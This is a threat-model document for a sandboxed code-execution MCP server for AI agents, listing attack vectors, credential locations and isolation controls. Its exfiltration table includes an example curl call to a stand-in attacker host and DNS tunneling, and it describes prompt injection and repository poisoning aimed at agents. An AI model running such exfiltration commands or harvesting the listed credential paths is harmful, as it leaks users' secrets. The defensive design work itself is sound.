# Security Model

Sandboxed code execution MCP server for AI agents. Executes untrusted code in isolated Linux namespaces with copy-on-write filesystem.

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│ TRUSTED: User's host system                                     │
│  ├── MCP server process (Rust, runs as user)                    │
│  ├── User's credentials (~/.ssh, ~/.aws, etc.)                  │
│  └── Host kernel                                                │
├─────────────────────────────────────────────────────────────────┤
│ UNTRUSTED: Sandbox contents                                     │
│  ├── AI-generated code and commands                             │
│  ├── Repository content (code, docs, PRs, issues)               │
│  ├── Downloaded packages (npm, pip, cargo)                      │
│  └── Package install scripts (postinstall, setup.py, build.rs)  │
└─────────────────────────────────────────────────────────────────┘
```

**Data flow**: AI agent → MCP server (stdio) → sandbox namespace → results back

## Threat Hierarchy (Severity Order)

| Priority | Threat | Impact |
|----------|--------|--------|
| **P0** | Sandbox escape to host | Full system compromise |
| **P1** | Credential/secret exfiltration | Account takeover, lateral movement |
| **P2** | Arbitrary network exfiltration | Data breach via covert channels |
| **P3** | Host filesystem modification | Data loss, persistence |
| **P4** | Denial of service | Resource exhaustion, stuck sessions |

## Attack Vectors

### AI-Specific (Highest Likelihood)

| Vector | Description | Mitigation |
|--------|-------------|------------|
| **Indirect prompt injection** | Malicious instructions in README, comments, PR descriptions parsed by agent | Sandbox isolates execution regardless of how agent was tricked |
| **Repository poisoning** | Hidden unicode, invisible comments, `.cursorrules`-style backdoors | Treat all repo content as untrusted input |
| **Multi-step attacks** | Early commands prepare filesystem state exploited by later commands | Session isolation, no persistent state across sessions unless explicit |

### Package Manager Attacks

| Vector | Mechanism | Mitigation |
|--------|-----------|------------|
| npm postinstall | Arbitrary shell execution on `npm install` | Run installs inside sandbox with `--ignore-scripts` option |
| pip setup.py | Python execution for source distributions | Prefer `--only-binary :all:`, sandbox all installs |
| Cargo build.rs | Rust code execution at compile time | No complete mitigation; sandbox compilation |
| Dependency confusion | Public package shadows internal name | Not directly our problem, but sandbox limits blast radius |
| Typosquatting | `reqeusts` vs `requests` | Sandbox limits exfiltration even if installed |

### Container/Namespace Escapes

| Vector | CVE Examples | Mitigation |
|--------|--------------|------------|
| **TIOCSTI injection** | CVE-2017-5226 | `--new-session` flag, seccomp block on ioctl 0x5412 |
| User namespace kernel bugs | CVE-2024-1086, CVE-2023-32233 | Kernel updates, minimize userns if possible |
| OverlayFS capability bypass | CVE-2023-2640 (Ubuntu) | Avoid Ubuntu-patched kernels, use fuse-overlayfs |
| /proc write escapes | CVE-2022-0492 (cgroups) | Read-only /proc/sys, no cgroup mounts |
| D-Bus escalation | CVE-2021-4034 | Never bind D-Bus sockets |
| Symlink races (TOCTOU) | CVE-2025-31133 (runc) | Atomic operations, O_NOFOLLOW |

### Data Exfiltration

| Target | Location | Mitigation |
|--------|----------|------------|
| SSH keys | `~/.ssh/` | Never mount; tmpfs overlay |
| Cloud creds | `~/.aws/`, `~/.config/gcloud/`, `~/.kube/` | Never mount |
| Git credentials | `.git/config`, `~/.gitconfig`, `~/.netrc` | Sanitize or overlay |
| Environment secrets | `/proc/*/environ`, `.env` files | Fresh environment, no host env passthrough |
| GPG keys | `~/.gnupg/` | Never mount |

### Network Exfiltration

| Channel | Technique | Mitigation |
|---------|-----------|------------|
| Direct HTTP/S | `curl attacker.com/?data=...` | Domain allowlist (package registries only) |
| DNS tunneling | `base64data.attacker.com` | Route DNS through controlled resolver |
| Package registry abuse | Exfil via package publish or download params | Monitor unusual registry traffic patterns |
| Allowed domain piggyback | Discord webhooks, webhook.site if allowed | Strict allowlist, no generic webhook domains |

## Security Controls

### Required (P0/P1 Mitigations)

1. **Namespace isolation**: User, mount, PID, network, IPC, UTS namespaces via `unshare`
2. **New session**: Always `setsid()` or `--new-session` to prevent TIOCSTI
3. **Credential isolation**: Never bind-mount `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gcloud`
4. **Seccomp filter**: Block dangerous syscalls (ptrace, mount, init_module, ioctl TIOCSTI)
5. **Capability drop**: Drop all capabilities, especially CAP_SYS_ADMIN, CAP_SYS_PTRACE
6. **Fresh /dev**: Mount new devtmpfs, don't expose host TTYs
7. **Network namespace**: Isolated network; allowlisted egress only if enabled

### Recommended (P2/P3 Mitigations)

1. **Landlock**: Filesystem access control as defense-in-depth (kernel 5.13+)
2. **Read-only base**: OverlayFS lower layer read-only, writes to tmpfs/session upper
3. **DNS control**: Route through resolving proxy with logging
4. **Resource limits**: cgroups v2 for CPU, memory, PID limits
5. **Timeout enforcement**: Kill long-running processes

### Configurable (User Choice)

1. **Network access**: Default isolated; opt-in allowlist for package registries
2. **Package script execution**: Document risks, recommend `--ignore-scripts`
3. **Session persistence**: Default ephemeral; opt-in persistence with cleanup

## Sandbox Filesystem Layout

```
/.                          # Sandbox root (overlay merged view)
├── usr/                    # Read-only from host
├── lib/, lib64/           # Read-only symlinks
├── bin/, sbin/            # Read-only from host
├── etc/                    # Minimal, sanitized
├── tmp/                    # Writable (tmpfs)
├── home/sandbox/          # Writable (overlay upper)
│   └── workspace/         # Bind-mount to project (overlay for writes)
├── proc/                   # Fresh procfs (hidepid=2 if possible)
├── dev/                    # Fresh devtmpfs (minimal devices)
└── sys/                    # Read-only or masked

Host-side session storage:
.mcp-sandboxes/<session-id>/
├── upper/                  # OverlayFS upper layer (writable changes)
├── work/                   # OverlayFS work directory
└── meta.json              # Session metadata (TTL, PID, created_at)
```

## Out of Scope

Threats we explicitly do NOT defend against:

- **Kernel 0-days**: We reduce attack surface but can't prevent unknown kernel bugs
- **Hardware side channels**: Spectre/Meltdown mitigations are host responsibility
- **Malicious MCP client**: The AI agent host (Claude, etc.) is trusted
- **User misconfiguration**: If user disables protections, that's on them
- **Pre-sandbox attacks**: Vulnerabilities in MCP server itself before sandboxing
- **Cryptographic attacks**: Not in scope for this project

## Implementation Checklist

Before any sandbox execution:

- [ ] New session established (setsid)
- [ ] All namespaces unshared
- [ ] Seccomp filter installed
- [ ] All capabilities dropped
- [ ] NO_NEW_PRIVS set
- [ ] Credential paths not mounted
- [ ] Network isolated or allowlisted
- [ ] Landlock rules applied (if available)
- [ ] Resource limits set
- [ ] Timeout scheduled

## Testing Requirements

Security-critical tests:

1. **TIOCSTI blocked**: Attempt terminal injection from sandbox, verify no effect
2. **Credential inaccessible**: Verify `~/.ssh/*` not readable from sandbox
3. **Network isolated**: Verify no connectivity when disabled; only allowlist when enabled
4. **Capability verification**: Verify `capsh --print` shows empty set
5. **Seccomp enforcement**: Verify blocked syscalls return EPERM/SIGSYS
6. **Escape regression tests**: Reproduce known CVE patterns, verify blocked

## Incident Response

If sandbox escape is discovered:

1. Document reproduction steps
2. Check if similar vector in known CVE databases
3. Identify which layer failed (namespace, seccomp, Landlock, etc.)
4. Add specific mitigation and regression test
5. Consider if architecture change needed

---

*Last updated: 2025-12-24*
*Review triggers: kernel updates, new escape CVEs, architecture changes*
